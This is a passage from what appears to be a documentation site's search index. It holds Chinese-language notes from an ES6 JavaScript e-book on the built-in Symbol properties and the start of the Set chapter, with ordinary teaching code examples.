<p>\u5982\u679c\u952e\u540d\u4f7f\u7528<code>Symbol</code>\u65b9\u6cd5\u751f\u6210\uff0c\u90a3\u4e48\u5916\u90e8\u5c06\u65e0\u6cd5\u5f15\u7528\u8fd9\u4e2a\u503c\uff0c\u5f53\u7136\u4e5f\u5c31\u65e0\u6cd5\u6539\u5199\u3002</p> <pre><code>// mod.js\nconst FOO_KEY = Symbol('foo');\n\n// \u540e\u9762\u4ee3\u7801\u76f8\u540c \u2026\u2026\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06\u5bfc\u81f4\u5176\u4ed6\u811a\u672c\u90fd\u65e0\u6cd5\u5f15\u7528<code>FOO_KEY</code>\u3002\u4f46\u8fd9\u6837\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5982\u679c\u591a\u6b21\u6267\u884c\u8fd9\u4e2a\u811a\u672c\uff0c\u6bcf\u6b21\u5f97\u5230\u7684<code>FOO_KEY</code>\u90fd\u662f\u4e0d\u4e00\u6837\u7684\u3002\u867d\u7136 Node \u4f1a\u5c06\u811a\u672c\u7684\u6267\u884c\u7ed3\u679c\u7f13\u5b58\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e0d\u4f1a\u591a\u6b21\u6267\u884c\u540c\u4e00\u4e2a\u811a\u672c\uff0c\u4f46\u662f\u7528\u6237\u53ef\u4ee5\u624b\u52a8\u6e05\u9664\u7f13\u5b58\uff0c\u6240\u4ee5\u4e5f\u4e0d\u662f\u7edd\u5bf9\u53ef\u9760\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbol_2","title":"\u5185\u7f6e\u7684 Symbol \u503c","text":"<p>\u540e\u9762\u7684Symbol\u5b9e\u9645\u6ca1\u6709\u4f7f\u7528\u8fc7\uff0c\u73b0\u5728\u4e86\u89e3\u3002</p> <p>\u9664\u4e86\u5b9a\u4e49\u81ea\u5df1\u4f7f\u7528\u7684 Symbol \u503c\u4ee5\u5916\uff0cES6 \u8fd8\u63d0\u4f9b\u4e86 11 \u4e2a\u5185\u7f6e\u7684 Symbol \u503c\uff0c\u6307\u5411\u8bed\u8a00\u5185\u90e8\u4f7f\u7528\u7684\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolhasinstance","title":"Symbol.hasInstance","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.hasInstance</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5185\u90e8\u65b9\u6cd5\u3002\u5f53\u5176\u4ed6\u5bf9\u8c61\u4f7f\u7528<code>instanceof</code>\u8fd0\u7b97\u7b26\uff0c\u5224\u65ad\u662f\u5426\u4e3a\u8be5\u5bf9\u8c61\u7684\u5b9e\u4f8b\u65f6\uff0c\u4f1a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002\u6bd4\u5982\uff0c<code>foo instanceof Foo</code>\u5728\u8bed\u8a00\u5185\u90e8\uff0c\u5b9e\u9645\u8c03\u7528\u7684\u662f<code>Foo[Symbol.hasInstance](foo)</code>\u3002</p> <pre><code>class MyClass {\n  [Symbol.hasInstance](foo) {\n    return foo instanceof Array;\n  }\n}\n\n[1, 2, 3] instanceof new MyClass() // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>MyClass</code>\u662f\u4e00\u4e2a\u7c7b\uff0c<code>new MyClass()</code>\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u3002\u8be5\u5b9e\u4f8b\u7684<code>Symbol.hasInstance</code>\u65b9\u6cd5\uff0c\u4f1a\u5728\u8fdb\u884c<code>instanceof</code>\u8fd0\u7b97\u65f6\u81ea\u52a8\u8c03\u7528\uff0c\u5224\u65ad\u5de6\u4fa7\u7684\u8fd0\u7b97\u5b50\u662f\u5426\u4e3a<code>Array</code>\u7684\u5b9e\u4f8b\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>class Even {\n  static [Symbol.hasInstance](obj) {\n    return Number(obj) % 2 === 0;\n  }\n}\n\n// \u7b49\u540c\u4e8e\nconst Even = {\n  [Symbol.hasInstance](obj) {\n    return Number(obj) % 2 === 0;\n  }\n};\n\n1 instanceof Even // false\n2 instanceof Even // true\n12345 instanceof Even // false\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolisconcatspreadable","title":"Symbol.isConcatSpreadable","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.isConcatSpreadable</code>\u5c5e\u6027\u7b49\u4e8e\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u5bf9\u8c61\u7528\u4e8e<code>Array.prototype.concat()</code>\u65f6\uff0c\u662f\u5426\u53ef\u4ee5\u5c55\u5f00\u3002</p> <pre><code>let arr1 = ['c', 'd'];\n['a', 'b'].concat(arr1, 'e') // ['a', 'b', 'c', 'd', 'e']\narr1[Symbol.isConcatSpreadable] // undefined\n\nlet arr2 = ['c', 'd'];\narr2[Symbol.isConcatSpreadable] = false;\n['a', 'b'].concat(arr2, 'e') // ['a', 'b', ['c','d'], 'e']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u6570\u7ec4\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u53ef\u4ee5\u5c55\u5f00\uff0c<code>Symbol.isConcatSpreadable</code>\u9ed8\u8ba4\u7b49\u4e8e<code>undefined</code>\u3002\u8be5\u5c5e\u6027\u7b49\u4e8e<code>true</code>\u65f6\uff0c\u4e5f\u6709\u5c55\u5f00\u7684\u6548\u679c\u3002</p> <p>\u4f2a\u6570\u7ec4\u6b63\u597d\u76f8\u53cd\uff0c\u9ed8\u8ba4\u4e0d\u5c55\u5f00\u3002\u5b83\u7684<code>Symbol.isConcatSpreadable</code>\u5c5e\u6027\u8bbe\u4e3a<code>true</code>\uff0c\u624d\u53ef\u4ee5\u5c55\u5f00\u3002</p> <pre><code>let obj = {length: 2, 0: 'c', 1: 'd'};\n['a', 'b'].concat(obj, 'e') // ['a', 'b', obj, 'e']\n\nobj[Symbol.isConcatSpreadable] = true;\n['a', 'b'].concat(obj, 'e') // ['a', 'b', 'c', 'd', 'e']\n</code></pre> <p><code>Symbol.isConcatSpreadable</code>\u5c5e\u6027\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u5728\u7c7b\u91cc\u9762\u3002</p> <pre><code>class A1 extends Array {\n  constructor(args) {\n    super(args);\n    this[Symbol.isConcatSpreadable] = true;\n  }\n}\nclass A2 extends Array {\n  constructor(args) {\n    super(args);\n  }\n  get [Symbol.isConcatSpreadable] () {\n    return false;\n  }\n}\nlet a1 = new A1();\na1[0] = 3;\na1[1] = 4;\nlet a2 = new A2();\na2[0] = 5;\na2[1] = 6;\n[1, 2].concat(a1).concat(a2)\n// [1, 2, 3, 4, [5, 6]]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7c7b<code>A1</code>\u662f\u53ef\u5c55\u5f00\u7684\uff0c\u7c7b<code>A2</code>\u662f\u4e0d\u53ef\u5c55\u5f00\u7684\uff0c\u6240\u4ee5\u4f7f\u7528<code>concat</code>\u65f6\u6709\u4e0d\u4e00\u6837\u7684\u7ed3\u679c\u3002</p> <p>\u6ce8\u610f\uff0c<code>Symbol.isConcatSpreadable</code>\u7684\u4f4d\u7f6e\u5dee\u5f02\uff0c<code>A1</code>\u662f\u5b9a\u4e49\u5728\u5b9e\u4f8b\u4e0a\uff0c<code>A2</code>\u662f\u5b9a\u4e49\u5728\u7c7b\u672c\u8eab\uff0c\u6548\u679c\u76f8\u540c\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolspecies","title":"Symbol.species","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.species</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002\u521b\u5efa\u884d\u751f\u5bf9\u8c61\u65f6\uff0c\u4f1a\u4f7f\u7528\u8be5\u5c5e\u6027\u3002</p> <pre><code>class MyArray extends Array {\n}\n\nconst a = new MyArray(1, 2, 3);\nconst b = a.map(x =&gt; x);\nconst c = a.filter(x =&gt; x &gt; 1);\n\nb instanceof MyArray // true\nc instanceof MyArray // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b<code>MyArray</code>\u7ee7\u627f\u4e86\u7236\u7c7b<code>Array</code>\uff0c<code>a</code>\u662f<code>MyArray</code>\u7684\u5b9e\u4f8b\uff0c<code>b</code>\u548c<code>c</code>\u662f<code>a</code>\u7684\u884d\u751f\u5bf9\u8c61\u3002\u4f60\u53ef\u80fd\u4f1a\u8ba4\u4e3a\uff0c<code>b</code>\u548c<code>c</code>\u90fd\u662f\u8c03\u7528\u6570\u7ec4\u65b9\u6cd5\u751f\u6210\u7684\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u6570\u7ec4\uff08<code>Array</code>\u7684\u5b9e\u4f8b\uff09\uff0c\u4f46\u5b9e\u9645\u4e0a\u5b83\u4eec\u4e5f\u662f<code>MyArray</code>\u7684\u5b9e\u4f8b\u3002</p> <p><code>Symbol.species</code>\u5c5e\u6027\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u63d0\u4f9b\u7684\u3002\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a<code>MyArray</code>\u8bbe\u7f6e<code>Symbol.species</code>\u5c5e\u6027\u3002</p> <pre><code>class MyArray extends Array {\n  static get [Symbol.species]() { return Array; }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u5b9a\u4e49\u4e86<code>Symbol.species</code>\u5c5e\u6027\uff0c\u521b\u5efa\u884d\u751f\u5bf9\u8c61\u65f6\u5c31\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u51fd\u6570\uff0c\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u3002\u8fd9\u4e2a\u4f8b\u5b50\u4e5f\u8bf4\u660e\uff0c\u5b9a\u4e49<code>Symbol.species</code>\u5c5e\u6027\u8981\u91c7\u7528<code>get</code>\u53d6\u503c\u5668\u3002\u9ed8\u8ba4\u7684<code>Symbol.species</code>\u5c5e\u6027\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>static get [Symbol.species]() {\n  return this;\n}\n</code></pre> <p>\u73b0\u5728\uff0c\u518d\u6765\u770b\u524d\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>class MyArray extends Array {\n  static get [Symbol.species]() { return Array; }\n}\n\nconst a = new MyArray();\nconst b = a.map(x =&gt; x);\n\nb instanceof MyArray // false\nb instanceof Array // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a.map(x =&gt; x)</code>\u751f\u6210\u7684\u884d\u751f\u5bf9\u8c61\uff0c\u5c31\u4e0d\u662f<code>MyArray</code>\u7684\u5b9e\u4f8b\uff0c\u800c\u76f4\u63a5\u5c31\u662f<code>Array</code>\u7684\u5b9e\u4f8b\u3002</p> <p>\u518d\u770b\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>class T1 extends Promise {\n}\n\nclass T2 extends Promise {\n  static get [Symbol.species]() {\n    return Promise;\n  }\n}\n\nnew T1(r =&gt; r()).then(v =&gt; v) instanceof T1 // true\nnew T2(r =&gt; r()).then(v =&gt; v) instanceof T2 // false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>T2</code>\u5b9a\u4e49\u4e86<code>Symbol.species</code>\u5c5e\u6027\uff0c<code>T1</code>\u6ca1\u6709\u3002\u7ed3\u679c\u5c31\u5bfc\u81f4\u4e86\u521b\u5efa\u884d\u751f\u5bf9\u8c61\u65f6\uff08<code>then</code>\u65b9\u6cd5\uff09\uff0c<code>T1</code>\u8c03\u7528\u7684\u662f\u81ea\u8eab\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u800c<code>T2</code>\u8c03\u7528\u7684\u662f<code>Promise</code>\u7684\u6784\u9020\u65b9\u6cd5\u3002</p> <p>\u603b\u4e4b\uff0c<code>Symbol.species</code>\u7684\u4f5c\u7528\u5728\u4e8e\uff0c\u5b9e\u4f8b\u5bf9\u8c61\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u518d\u6b21\u8c03\u7528\u81ea\u8eab\u7684\u6784\u9020\u51fd\u6570\u65f6\uff0c\u4f1a\u8c03\u7528\u8be5\u5c5e\u6027\u6307\u5b9a\u7684\u6784\u9020\u51fd\u6570\u3002\u5b83\u4e3b\u8981\u7684\u7528\u9014\u662f\uff0c\u6709\u4e9b\u7c7b\u5e93\u662f\u5728\u57fa\u7c7b\u7684\u57fa\u7840\u4e0a\u4fee\u6539\u7684\uff0c\u90a3\u4e48\u5b50\u7c7b\u4f7f\u7528\u7ee7\u627f\u7684\u65b9\u6cd5\u65f6\uff0c\u4f5c\u8005\u53ef\u80fd\u5e0c\u671b\u8fd4\u56de\u57fa\u7c7b\u7684\u5b9e\u4f8b\uff0c\u800c\u4e0d\u662f\u5b50\u7c7b\u7684\u5b9e\u4f8b\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolmatch","title":"Symbol.match","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.match</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u51fd\u6570\u3002\u5f53\u6267\u884c<code>str.match(myObject)</code>\u65f6\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u5b58\u5728\uff0c\u4f1a\u8c03\u7528\u5b83\uff0c\u8fd4\u56de\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002</p> <pre><code>String.prototype.match(regexp)\n// \u7b49\u540c\u4e8e\nregexp[Symbol.match](this)\n\nclass MyMatcher {\n  [Symbol.match](string) {\n    return 'hello world'.indexOf(string);\n  }\n}\n\n'e'.match(new MyMatcher()) // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolreplace","title":"Symbol.replace","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.replace</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5f53\u8be5\u5bf9\u8c61\u88ab<code>String.prototype.replace</code>\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u4f1a\u8fd4\u56de\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002</p> <pre><code>String.prototype.replace(searchValue, replaceValue)\n// \u7b49\u540c\u4e8e\nsearchValue[Symbol.replace](this, replaceValue)\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const x = {};\nx[Symbol.replace] = (...s) =&gt; console.log(s);\n\n'Hello'.replace(x, 'World') // [\"Hello\", \"World\"]\n</code></pre> <p><code>Symbol.replace</code>\u65b9\u6cd5\u4f1a\u6536\u5230\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f<code>replace</code>\u65b9\u6cd5\u6b63\u5728\u4f5c\u7528\u7684\u5bf9\u8c61\uff0c\u4e0a\u9762\u4f8b\u5b50\u662f<code>Hello</code>\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u66ff\u6362\u540e\u7684\u503c\uff0c\u4e0a\u9762\u4f8b\u5b50\u662f<code>World</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolsearch","title":"Symbol.search","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.search</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5f53\u8be5\u5bf9\u8c61\u88ab<code>String.prototype.search</code>\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u4f1a\u8fd4\u56de\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002</p> <pre><code>String.prototype.search(regexp)\n// \u7b49\u540c\u4e8e\nregexp[Symbol.search](this)\n\nclass MySearch {\n  constructor(value) {\n    this.value = value;\n  }\n  [Symbol.search](string) {\n    return string.indexOf(this.value);\n  }\n}\n'foobar'.search(new MySearch('foo')) // 0\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolsplit","title":"Symbol.split","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.split</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5f53\u8be5\u5bf9\u8c61\u88ab<code>String.prototype.split</code>\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u4f1a\u8fd4\u56de\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002</p> <pre><code>String.prototype.split(separator, limit)\n// \u7b49\u540c\u4e8e\nseparator[Symbol.split](this, limit)\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>class MySplitter {\n  constructor(value) {\n    this.value = value;\n  }\n  [Symbol.split](string) {\n    let index = string.indexOf(this.value);\n    if (index === -1) {\n      return string;\n    }\n    return [\n      string.substr(0, index),\n      string.substr(index + this.value.length)\n    ];\n  }\n}\n\n'foobar'.split(new MySplitter('foo'))\n// ['', 'bar']\n\n'foobar'.split(new MySplitter('bar'))\n// ['foo', '']\n\n'foobar'.split(new MySplitter('baz'))\n// 'foobar'\n</code></pre> <p>\u4e0a\u9762\u65b9\u6cd5\u4f7f\u7528<code>Symbol.split</code>\u65b9\u6cd5\uff0c\u91cd\u65b0\u5b9a\u4e49\u4e86\u5b57\u7b26\u4e32\u5bf9\u8c61\u7684<code>split</code>\u65b9\u6cd5\u7684\u884c\u4e3a\uff0c</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symboliterator","title":"Symbol.iterator","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.iterator</code>\u5c5e\u6027\uff0c\u6307\u5411\u8be5\u5bf9\u8c61\u7684\u9ed8\u8ba4\u904d\u5386\u5668\u65b9\u6cd5\u3002</p> <pre><code>const myIterable = {};\nmyIterable[Symbol.iterator] = function* () {\n  yield 1;\n  yield 2;\n  yield 3;\n};\n\n[...myIterable] // [1, 2, 3]\n</code></pre> <p>\u5bf9\u8c61\u8fdb\u884c<code>for...of</code>\u5faa\u73af\u65f6\uff0c\u4f1a\u8c03\u7528<code>Symbol.iterator</code>\u65b9\u6cd5\uff0c\u8fd4\u56de\u8be5\u5bf9\u8c61\u7684\u9ed8\u8ba4\u904d\u5386\u5668\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u53c2\u89c1\u300aIterator \u548c for...of \u5faa\u73af\u300b\u4e00\u7ae0\u3002</p> <pre><code>class Collection {\n  *[Symbol.iterator]() {\n    let i = 0;\n    while(this[i] !== undefined) {\n      yield this[i];\n      ++i;\n    }\n  }\n}\n\nlet myCollection = new Collection();\nmyCollection[0] = 1;\nmyCollection[1] = 2;\n\nfor(let value of myCollection) {\n  console.log(value);\n}\n// 1\n// 2\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symboltoprimitive","title":"Symbol.toPrimitive","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.toPrimitive</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u65b9\u6cd5\u3002\u8be5\u5bf9\u8c61\u88ab\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u65f6\uff0c\u4f1a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8fd4\u56de\u8be5\u5bf9\u8c61\u5bf9\u5e94\u7684\u539f\u59cb\u7c7b\u578b\u503c\u3002</p> <p><code>Symbol.toPrimitive</code>\u88ab\u8c03\u7528\u65f6\uff0c\u4f1a\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u8868\u793a\u5f53\u524d\u8fd0\u7b97\u7684\u6a21\u5f0f\uff0c\u4e00\u5171\u6709\u4e09\u79cd\u6a21\u5f0f\u3002</p> <ul> <li>Number\uff1a\u8be5\u573a\u5408\u9700\u8981\u8f6c\u6210\u6570\u503c</li> <li>String\uff1a\u8be5\u573a\u5408\u9700\u8981\u8f6c\u6210\u5b57\u7b26\u4e32</li> <li>Default\uff1a\u8be5\u573a\u5408\u53ef\u4ee5\u8f6c\u6210\u6570\u503c\uff0c\u4e5f\u53ef\u4ee5\u8f6c\u6210\u5b57\u7b26\u4e32</li> </ul> <pre><code>let obj = {\n  [Symbol.toPrimitive](hint) {\n    switch (hint) {\n      case 'number':\n        return 123;\n      case 'string':\n        return 'str';\n      case 'default':\n        return 'default';\n      default:\n        throw new Error();\n     }\n   }\n};\n\n2 * obj // 246\n3 + obj // '3default'\nobj == 'default' // true\nString(obj) // 'str'\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symboltostringtag","title":"Symbol.toStringTag","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.toStringTag</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u65b9\u6cd5\u3002\u5728\u8be5\u5bf9\u8c61\u4e0a\u9762\u8c03\u7528<code>Object.prototype.toString</code>\u65b9\u6cd5\u65f6\uff0c\u5982\u679c\u8fd9\u4e2a\u5c5e\u6027\u5b58\u5728\uff0c\u5b83\u7684\u8fd4\u56de\u503c\u4f1a\u51fa\u73b0\u5728<code>toString</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u4e4b\u4e2d\uff0c\u8868\u793a\u5bf9\u8c61\u7684\u7c7b\u578b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u5b9a\u5236<code>[object Object]</code>\u6216<code>[object Array]</code>\u4e2d<code>object</code>\u540e\u9762\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\u3002</p> <pre><code>// \u4f8b\u4e00\n({[Symbol.toStringTag]: 'Foo'}.toString())\n// \"[object Foo]\"\n\n// \u4f8b\u4e8c\nclass Collection {\n  get [Symbol.toStringTag]() {\n    return 'xxx';\n  }\n}\nlet x = new Collection();\nObject.prototype.toString.call(x) // \"[object xxx]\"\n</code></pre> <p>ES6 \u65b0\u589e\u5185\u7f6e\u5bf9\u8c61\u7684<code>Symbol.toStringTag</code>\u5c5e\u6027\u503c\u5982\u4e0b\u3002</p> <ul> <li><code>JSON[Symbol.toStringTag]</code>\uff1a'JSON'</li> <li><code>Math[Symbol.toStringTag]</code>\uff1a'Math'</li> <li>Module \u5bf9\u8c61<code>M[Symbol.toStringTag]</code>\uff1a'Module'</li> <li><code>ArrayBuffer.prototype[Symbol.toStringTag]</code>\uff1a'ArrayBuffer'</li> <li><code>DataView.prototype[Symbol.toStringTag]</code>\uff1a'DataView'</li> <li><code>Map.prototype[Symbol.toStringTag]</code>\uff1a'Map'</li> <li><code>Promise.prototype[Symbol.toStringTag]</code>\uff1a'Promise'</li> <li><code>Set.prototype[Symbol.toStringTag]</code>\uff1a'Set'</li> <li><code>%TypedArray%.prototype[Symbol.toStringTag]</code>\uff1a'Uint8Array'\u7b49</li> <li><code>WeakMap.prototype[Symbol.toStringTag]</code>\uff1a'WeakMap'</li> <li><code>WeakSet.prototype[Symbol.toStringTag]</code>\uff1a'WeakSet'</li> <li><code>%MapIteratorPrototype%[Symbol.toStringTag]</code>\uff1a'Map Iterator'</li> <li><code>%SetIteratorPrototype%[Symbol.toStringTag]</code>\uff1a'Set Iterator'</li> <li><code>%StringIteratorPrototype%[Symbol.toStringTag]</code>\uff1a'String Iterator'</li> <li><code>Symbol.prototype[Symbol.toStringTag]</code>\uff1a'Symbol'</li> <li><code>Generator.prototype[Symbol.toStringTag]</code>\uff1a'Generator'</li> <li><code>GeneratorFunction.prototype[Symbol.toStringTag]</code>\uff1a'GeneratorFunction'</li> </ul>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolunscopables","title":"Symbol.unscopables","text":"<p>\u5bf9\u8c61\u7684<code>Symbol.unscopables</code>\u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u6307\u5b9a\u4e86\u4f7f\u7528<code>with</code>\u5173\u952e\u5b57\u65f6\uff0c\u54ea\u4e9b\u5c5e\u6027\u4f1a\u88ab<code>with</code>\u73af\u5883\u6392\u9664\u3002</p> <pre><code>Array.prototype[Symbol.unscopables]\n// {\n//   copyWithin: true,\n//   entries: true,\n//   fill: true,\n//   find: true,\n//   findIndex: true,\n//   includes: true,\n//   keys: true\n// }\n\nObject.keys(Array.prototype[Symbol.unscopables])\n// ['copyWithin', 'entries', 'fill', 'find', 'findIndex', 'includes', 'keys']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u6570\u7ec4\u6709 7 \u4e2a\u5c5e\u6027\uff0c\u4f1a\u88ab<code>with</code>\u547d\u4ee4\u6392\u9664\u3002</p> <pre><code>// \u6ca1\u6709 unscopables \u65f6\nclass MyClass {\n  foo() { return 1; }\n}\n\nvar foo = function () { return 2; };\n\nwith (MyClass.prototype) {\n  foo(); // 1\n}\n\n// \u6709 unscopables \u65f6\nclass MyClass {\n  foo() { return 1; }\n  get [Symbol.unscopables]() {\n    return { foo: true };\n  }\n}\n\nvar foo = function () { return 2; };\n\nwith (MyClass.prototype) {\n  foo(); // 2\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u6307\u5b9a<code>Symbol.unscopables</code>\u5c5e\u6027\uff0c\u4f7f\u5f97<code>with</code>\u8bed\u6cd5\u5757\u4e0d\u4f1a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5bfb\u627e<code>foo</code>\u5c5e\u6027\uff0c\u5373<code>foo</code>\u5c06\u6307\u5411\u5916\u5c42\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"Set \u548c Map \u6570\u636e\u7ed3\u6784","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 32470  \u9605\u8bfb65\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#set","title":"Set","text":""},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_1","title":"\u57fa\u672c\u7528\u6cd5","text":"<p>Set \u7c7b\u4f3c\u4e8e\u6570\u7ec4\uff0c\u4f46\u662f\u6210\u5458\u7684\u503c\u90fd\u662f\u552f\u4e00\u7684\uff0c\u6ca1\u6709\u91cd\u590d\u7684\u503c\u3002<code>Set</code>\u672c\u8eab\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Set \u6570\u636e\u7ed3\u6784\u3002\u6240\u4ee5\u53ef\u4ee5\u5f88\u597d\u7684\u7528\u4e8e\u6570\u7ec4\u53bb\u91cd\u3002</p> <pre><code>const s = new Set();\n[2, 3, 5, 4, 5, 2, 2].forEach(x =&gt; s.add(x));\n\nfor (let i of s) {\n  console.log(i);\n}\n// 2 3 5 4\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7<code>add()</code>\u65b9\u6cd5\u5411 Set \u7ed3\u6784\u52a0\u5165\u6210\u5458\uff0c\u7ed3\u679c\u8868\u660e Set \u7ed3\u6784\u4e0d\u4f1a\u6dfb\u52a0\u91cd\u590d\u7684\u503c\u3002</p> <p><code>Set</code>\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u6216\u8005\u5177\u6709\u904d\u5386\u5668\u5c5e\u6027\u7684\u7c7b\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u6765\u521d\u59cb\u5316\u3002</p> <pre><code>const set = new Set([1, 2, 3, 4, 4]);\n[...set]\nset.size // 4\n// [1, 2, 3, 4]\n\nlet arr = [1,2,3,4];\nconst set = new Set(arr);\nconst divs = document.querySelectorAll('div');\nconst set2 = new Set(divs);\nset2.size = 30;\n\n// \u7c7b\u4f3c\u4e8e\nconst set = new Set();\ndocument.querySelectorAll('div').forEach(div =&gt; set.add(div));\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e5f\u5c55\u793a\u4e86\u4e00\u79cd==\u53bb\u9664\u6570\u7ec4\u91cd\u590d\u6210\u5458\u7684\u65b9\u6cd5==\u3002</p> <pre><code>// \u53bb\u9664\u6570\u7ec4\u7684\u91cd\u590d\u6210\u5458\n[...new Set(array)]\n\nlet arr = [];\nlet newArr = [...new Set(arr)]; //\u5148\u628a\u6570\u7ec4\u8f6c\u53d8\u6210set\u53bb\u6389\u91cd\u590d\u503c\uff0c\u7136\u540e\u628aSet\u7684\u7c7b\u6570\u7ec4\u4f7f\u7528rest\u65b9\u6cd5\u8f6c\u5316\u6210\u6570\u7ec4\n</code></pre> 